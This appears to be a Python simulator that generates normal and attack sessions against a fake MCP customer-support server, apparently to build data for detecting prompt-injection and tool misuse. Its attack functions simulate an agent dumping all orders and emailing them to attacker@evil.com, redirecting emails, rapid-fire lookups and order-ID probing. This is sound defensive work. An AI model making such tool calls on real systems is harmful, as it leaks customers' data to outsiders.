"""
Traffic Simulator

Generates two kinds of sessions against the fake MCP server:

  NORMAL sessions -> a customer asks about their own order, gets one
                      lookup + one matching email. Natural human timing.

  ATTACK sessions -> simulate prompt-injection / tool-misuse patterns:
      - bulk_exfiltration : "get ALL orders" then email to an unknown address
      - mismatched_recipient : legit-looking lookup, but email goes to a
                                 completely different (attacker) address
      - rapid_fire : many lookups in a very short time window (scripted bot)
      - reconnaissance : sequential order_id guessing (10001, 10002, 10003 ...)
"""

import time
import random
import uuid
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).parent))
from mcp_server import MCPServer, CUSTOMER_DB, NUM_CUSTOMERS

random.seed(42)


def run_normal_session(srv: MCPServer):
    """One ordinary customer support interaction."""
    sid = str(uuid.uuid4())
    cust_id = random.randint(1, NUM_CUSTOMERS)
    order_id = CUSTOMER_DB[cust_id]["order_id"]
    email = CUSTOMER_DB[cust_id]["email"]

    t = time.time()
    srv.handle_request(sid, "get_customer_order", {"order_id": order_id}, request_time=t)

    # human-like delay before the agent replies (0.5s - 4s)
    t += random.uniform(0.5, 4.0)
    srv.handle_request(sid, "send_email", {"customer_email": email, "message": "order update"}, request_time=t)


def run_attack_bulk_exfiltration(srv: MCPServer):
    """Attacker tricks agent into dumping every order and emailing it out."""
    sid = str(uuid.uuid4())
    t = time.time()
    srv.handle_request(sid, "get_customer_order", {"order_id": "ALL"}, request_time=t)
    t += random.uniform(0.1, 0.5)  # attacker script doesn't pause naturally
    srv.handle_request(sid, "send_email", {"customer_email": "attacker@evil.com", "message": "data dump"}, request_time=t)


def run_attack_mismatched_recipient(srv: MCPServer):
    """Looks like a normal lookup, but email is redirected to an attacker."""
    sid = str(uuid.uuid4())
    cust_id = random.randint(1, NUM_CUSTOMERS)
    order_id = CUSTOMER_DB[cust_id]["order_id"]

    t = time.time()
    srv.handle_request(sid, "get_customer_order", {"order_id": order_id}, request_time=t)
    t += random.uniform(0.2, 1.0)
    srv.handle_request(sid, "send_email", {"customer_email": "attacker@evil.com", "message": "redirected"}, request_time=t)


def run_attack_rapid_fire(srv: MCPServer):
    """Scripted bot hammering the lookup tool with almost no delay."""
    sid = str(uuid.uuid4())
    t = time.time()
    n_calls = random.randint(5, 12)
    for _ in range(n_calls):
        order_id = random.choice(list(CUSTOMER_DB.values()))["order_id"]
        srv.handle_request(sid, "get_customer_order", {"order_id": order_id}, request_time=t)
        t += random.uniform(0.01, 0.08)  # near-instant, inhuman pace


def run_attack_reconnaissance(srv: MCPServer):
    """Sequential ID guessing -- probing for valid order IDs."""
    sid = str(uuid.uuid4())
    start = random.randint(10001, 10400)
    t = time.time()
    for oid in range(start, start + random.randint(6, 10)):
        srv.handle_request(sid, "get_customer_order", {"order_id": oid}, request_time=t)
        t += random.uniform(0.05, 0.2)


ATTACK_GENERATORS = [
    run_attack_bulk_exfiltration,
    run_attack_mismatched_recipient,
    run_attack_rapid_fire,
    run_attack_reconnaissance,
]


def generate_dataset(n_normal=400, n_attack=80):
    log_path = Path(__file__).parent.parent / "data" / "traffic_log.jsonl"
    if log_path.exists():
        log_path.unlink()

    srv = MCPServer()

    session_labels = {}  # session_id -> 0 (normal) / 1 (attack), tracked separately

    for _ in range(n_normal):
        run_normal_session(srv)

    for _ in range(n_attack):
        gen = random.choice(ATTACK_GENERATORS)
        gen(srv)

    print(f"Generated {n_normal} normal sessions and {n_attack} attack sessions.")
    print(f"Raw traffic log written to {log_path}")


if __name__ == "__main__":
    generate_dataset()
